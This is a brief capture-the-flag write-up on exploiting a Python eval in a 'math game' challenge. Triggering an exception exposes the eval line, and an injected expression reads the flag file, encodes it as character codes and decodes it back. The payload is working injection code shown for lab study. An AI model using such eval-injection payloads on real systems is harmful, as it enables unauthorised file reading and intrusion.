### math game

Simple python eval exploitation. No source code given, but stderr is redirected - simply triggering exception will show line of code with eval instruction.

```
1) '100932'.join([str(ord(x)) for x in '' + open("./flag").read()])
2) ''.join([chr(int(x)) for x in s.split('100932')])
```
